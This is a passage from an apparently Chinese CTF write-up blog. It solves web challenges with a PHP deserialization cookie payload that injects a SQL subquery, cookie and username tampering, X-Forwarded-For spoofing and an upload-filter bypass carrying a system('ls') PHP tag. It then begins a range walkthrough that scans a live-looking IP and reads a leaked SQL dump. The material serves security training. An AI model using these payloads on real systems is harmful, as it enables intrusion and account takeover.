&#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top: <span class="number">50</span>%;</span><br><span class="line">        left: <span class="number">50</span>%;</span><br><span class="line">        transform: <span class="title function_ invoke__">translate</span>(-<span class="number">50</span>%, -<span class="number">50</span>%);</span><br><span class="line">        width: <span class="number">400</span>px;</span><br><span class="line">        padding: <span class="number">40</span>px;</span><br><span class="line">        background: <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">.8</span>);</span><br><span class="line">        box-sizing: border-box;</span><br><span class="line">        box-shadow: <span class="number">0</span> <span class="number">15</span>px <span class="number">25</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">.5</span>);</span><br><span class="line">        border-radius: <span class="number">10</span>px;</span><br><span class="line">        <span class="comment">/*登录窗口边角圆滑*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box h2 &#123;</span><br><span class="line">        margin: <span class="number">0</span> <span class="number">0</span> <span class="number">30</span>px;</span><br><span class="line">        padding: <span class="number">0</span>;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox &#123;</span><br><span class="line">        position: relative;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox input &#123;</span><br><span class="line">        width: <span class="number">100</span>%;</span><br><span class="line">        padding: <span class="number">10</span>px <span class="number">0</span>;</span><br><span class="line">        font-size: <span class="number">16</span>px;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        letter-spacing: <span class="number">1</span>px;</span><br><span class="line">        margin-bottom: <span class="number">30</span>px;</span><br><span class="line">        <span class="comment">/*输入框设置*/</span></span><br><span class="line">        border: none;</span><br><span class="line">        border-bottom: <span class="number">1</span>px solid <span class="comment">#fff;</span></span><br><span class="line">        outline: none;</span><br><span class="line">        background: transparent;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox label &#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top: <span class="number">0</span>;</span><br><span class="line">        left: <span class="number">0</span>;</span><br><span class="line">        padding: <span class="number">10</span>px <span class="number">0</span>;</span><br><span class="line">        font-size: <span class="number">16</span>px;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        pointer-events: none;</span><br><span class="line">        transition: <span class="number">.5</span>s;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox input:focus~label,</span><br><span class="line">    .box .inputBox input:valid~label &#123;</span><br><span class="line">        top: -<span class="number">18</span>px;</span><br><span class="line">        left: <span class="number">0</span>;</span><br><span class="line">        color: <span class="comment">#03a9f4;</span></span><br><span class="line">        font-size: <span class="number">12</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">        background: transparent;</span><br><span class="line">        border: none;</span><br><span class="line">        outline: none;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        background: <span class="comment">#03a9f4;</span></span><br><span class="line">        padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">        cursor: pointer;</span><br><span class="line">        border-radius: <span class="number">5</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">box</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;请登录&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inputBox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>=&quot;&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span>&gt;用户名&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inputBox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">required</span>=&quot;&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span>&gt;密码&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;&quot; <span class="title">value</span>=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &#x27;<span class="title">conn</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class"><span class="title">include</span> &#x27;<span class="title">flag</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span> ($<span class="title">_COOKIE</span>[&#x27;<span class="title">last_login_info</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="variable">$last_login_info</span> = <span class="title function_ invoke__">unserialize</span> (<span class="title function_ invoke__">base64_decode</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;last_login_info&#x27;</span>]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$last_login_info</span>) &amp;&amp; <span class="variable">$last_login_info</span>[<span class="string">&#x27;ip&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;WAF info: your ip status has been changed, you are dangrous.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_encode</span> (<span class="title function_ invoke__">serialize</span> (<span class="keyword">array</span> ( <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))) ;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span> (<span class="string">&#x27;last_login_info&#x27;</span>, <span class="variable">$cookie</span>, <span class="title function_ invoke__">time</span> () + (<span class="number">86400</span> * <span class="number">30</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">	<span class="variable">$password</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>();</span><br><span class="line">	<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">	<span class="variable">$sql</span>-&gt;table = <span class="variable">$table</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">check_login</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>源码ip.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure>
<h2 id="思路">思路</h2>
<p>1.index当中有unserialize,并且conn当中有wakeup魔术方法,二者构成了php反序列化漏洞.unserialize的入口为cookie.</p>
<p>2.仔细看的话其实有三个参数.username和password这两个是最明显的,可以通过post直接传进去;table参数就需要我们用反序列化进行传参了.</p>
<p>3.username和password在index当中经过了addslashes的处理,而table并没有.所以如果我们以table参数作为sql注入点,就避免了addslashes的转义</p>
<p>4.waf()名单当中没有过滤小括号,可以使用子查询</p>
<p>5.以admin登录进去就返回flag</p>
<h2 id="知识点">知识点</h2>
<p>临时表:<a href="https://blog.csdn.net/Elite__zhb/article/details/129654615">有关临时表的博客</a></p>
<ul>
<li>是建立在系统临时文件夹中的表；</li>
<li>只在当前连接可见，当关闭连接时，MySQL会自动删除表并释放所有空间；</li>
<li>如果使用了其他MySQL客户端程序连接MySQL数据库服务器来创建临时表，那么只有在关闭客户端程序时才会销毁临时表</li>
</ul>
<p><img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503000610593.png" alt="image-20250503000610593"></p>
<p>子查询与临时表结合:(select ‘admin’ username,‘123’,password)a</p>
<table>
<thead>
<tr>
<th style="text-align:left">username</th>
<th style="text-align:left">password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">admin</td>
<td style="text-align:left">123</td>
</tr>
</tbody>
</table>
<p>标准语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &#x27;admin&#x27; AS username, &#x27;123&#x27; AS password</span><br></pre></td></tr></table></figure>
<p>此表别名为a</p>
<h2 id="操作实现打flag">操作实现打flag</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&quot;(select &#x27;admin&#x27; username,&#x27;123&#x27;password)a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>())));</span><br><span class="line"></span><br><span class="line">结果为</span><br><span class="line">YToxOntpOjA7TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NDA6IihzZWxlY3QgJ2FkbWluJyB1c2VybmFtZSwnMTIzJ3Bhc3N3b3JkKWEiO3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MzoiMTIzIjtzOjQ6ImNvbm4iO047fX0</span><br></pre></td></tr></table></figure>
<p>把结果给cookie,然后进源码拿flag<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503001304830.png" alt="image-20250503001304830"></p>
<h1>bug</h1>
<p>越权	IP欺骗</p>
<p>登录题目</p>
<p>1.sql注入?应该不是,有注册和改密码界面</p>
<p>2.cookie?注册不同的账号登录进去发现是不同的cookie,应该与cookie有关</p>
<p>这里以账号123456,密码123456登录进去进行测试cookie</p>
<p>方法一:这里的cookie寻常爆破不出来</p>
<p>发现home,personal,changepwd和logout可以正常查看或退出,而manage不可以,那么<strong>思路</strong>应该就是通过cookie来看admin的生日,然后改密码进入manage界面</p>
<p>我们在123456的personal当中看到了<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503005934764.png" alt="image-20250503005934764"></p>
<p>前面有一个UID,联想一下cookie也许是UID:username吗?答案就是这样的:black_flag:</p>
<p>方法二:使用123456进行重置密码,在第二个界面有用户名,这里也存在越权漏洞</p>
<p><img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503010522691.png" alt="image-20250503010522691"></p>
<p>bp抓一下果然是<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503010553527.png" alt="image-20250503010553527"></p>
<p>把username改为admin之后就可以重置admin的密码了</p>
<p>接下来就是manage界面了发现弹出alert了<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503010728292.png" alt="image-20250503010728292"></p>
<p>ip欺骗:X-Forwarded-For:127.0.0.1</p>
<p><img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503011024821.png" alt="image-20250503011024821"></p>
<p>index.php?module=filemanage&amp;do=???</p>
<p>这里就要猜了,我们ctf学过的,有关的知识点,并且涉及这里的url,也许是upload?<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503011229635.png" alt="image-20250503011229635"></p>
<p>这里存在waf</p>
<p>这里php5绕过文件后缀名,内容用html绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;system(&#x27;ls&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>其实这里并不需要system(‘ls’);或者🐎子,因为我在测试的时候发现alert(1);也可以</p>
<p>因为他直接返回flag了<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503012045377.png" alt="image-20250503012045377"></p>
<h3 id="ics-07">ics-07</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工控云管理系统项目管理页面解析漏洞</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      page : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; <span class="title function_ invoke__">floatval</span>(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = False;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>代码分为三部分</p>
<p>代码二当中存在上传文件的函数<br>
并且存在过滤,文件名后缀当中不能含有php,phtml等字样<br>
那么怎样绕过呢?<br>
1.apache2.x版本存在解析漏洞:1.php.xxx会被当作php来解析<br>
2.php、php3、php4、php5、php7、phtml、pht、phs、<a href="https://blog.csdn.net/cnds123/article/details/125962911">shtml</a>、pwml</p>
<p>第三部当中的if判断当中有一个floatval:获取变量的浮点值,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">&#x27;122.34343The&#x27;</span>;</span><br><span class="line"><span class="variable">$float_value_of_var</span> = <span class="title function_ invoke__">floatval</span> (<span class="variable">$var</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$float_value_of_var</span>; <span class="comment">// 打印出 122.34343</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>substr最后的数字必须是9,那么我们穿1xxxx9中间任意字符即可</p>
<p>第一部分代码看着有作用,其实到后面卵用都没,可以直接不管他</p>
<p>最后传文件的时候传入<img src="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/image-20250503144833477.png" alt="image-20250503144833477"></p>
]]></content>
  </entry>
  <entry>
    <title>州弟学安全靶场复现</title>
    <url>/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>网址：<a href="http://111.119.241.115:10088/">http://111.119.241.115:10088/</a></p>
<p>这里的网站是作者依靠软件独自搭建，无法通过github等开源网站找到源代码，也就是说我们无法审计代码、本地复现。</p>
<p>我们依靠dirsearch可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\ssz&gt; dirsearch -u http://111.119.241.115:10088/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289</span><br><span class="line"></span><br><span class="line">Target: http://111.119.241.115:10088/</span><br><span class="line"></span><br><span class="line">[15:44:40] Scanning:</span><br><span class="line">[15:44:54] 302 -     0B - /admin.php  -&gt;  login.php</span><br><span class="line">[15:45:02] 302 -     0B - /article.php  -&gt;  front_articles.php</span><br><span class="line">[15:45:02] 301 -   328B - /assets  -&gt;  http://111.119.241.115:10088/assets/</span><br><span class="line">[15:45:02] 403 -   300B - /assets/</span><br><span class="line">[15:45:06] 403 -   304B - /components/</span><br><span class="line">[15:45:06] 301 -   332B - /components  -&gt;  http://111.119.241.115:10088/components/</span><br><span class="line">[15:45:08] 200 -    5KB - /database.sql</span><br><span class="line">[15:45:14] 200 -   27KB - /index.php</span><br><span class="line">[15:45:15] 200 -   27KB - /index.php/login/</span><br><span class="line">[15:45:15] 200 -   238B - /install.php</span><br><span class="line">[15:45:15] 200 -   238B - /install.php?profile=default</span><br><span class="line">[15:45:17] 200 -    2KB - /login.php</span><br><span class="line">[15:45:28] 403 -   307B - /server-status/</span><br><span class="line">[15:45:28] 403 -   306B - /server-status</span><br><span class="line">[15:45:28] 302 -     0B - /settings.php  -&gt;  login.php</span><br><span class="line">[15:45:33] 302 -     0B - /upload.php  -&gt;  login.php</span><br><span class="line">[15:45:33] 301 -   329B - /uploads  -&gt;  http://111.119.241.115:10088/uploads/</span><br><span class="line">[15:45:33] 403 -   301B - /uploads/</span><br></pre></td></tr></table></figure>
<p>我们可以看到有一个database.sql，这是一个mysql数据文件。</p>
<p><strong>sql文件怎样查看？</strong></p>
<p>这里直接给出源码加解释</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- MySQL dump 10.13  Distrib 5.7.35, for Linux (x86_64)</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- Host: localhost    Database: cms_database</span></span><br><span class="line"><span class="comment">-- ------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置字符集和时间区域等环境变量，确保数据导入时的兼容性</span></span><br><span class="line"><span class="comment">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET NAMES utf8 */</span>;</span><br><span class="line"><span class="comment">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */</span>;</span><br><span class="line"><span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span>;</span><br><span class="line"><span class="comment">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */</span>;</span><br><span class="line"><span class="comment">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#x27;NO_AUTO_VALUE_ON_ZERO&#x27; */</span>;</span><br><span class="line"><span class="comment">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 `admins` 表，用于存储管理员信息</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `admins`; <span class="comment">-- 如果表已存在，则先删除</span></span><br><span class="line"><span class="comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = utf8 */</span>;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `admins` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT, <span class="comment">-- 主键，自动递增</span></span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 用户名，唯一</span></span><br><span class="line">  `password_hash` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 密码哈希值，存储加密后的密码</span></span><br><span class="line">  `email` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>, <span class="comment">-- 邮箱地址，可选</span></span><br><span class="line">  `role` enum(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;auditor&#x27;</span>) <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;auditor&#x27;</span>, <span class="comment">-- 角色，可选值为 &#x27;admin&#x27; 或 &#x27;auditor&#x27;，默认为 &#x27;auditor&#x27;</span></span><br><span class="line">  `created_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 创建时间，默认为当前时间</span></span><br><span class="line">  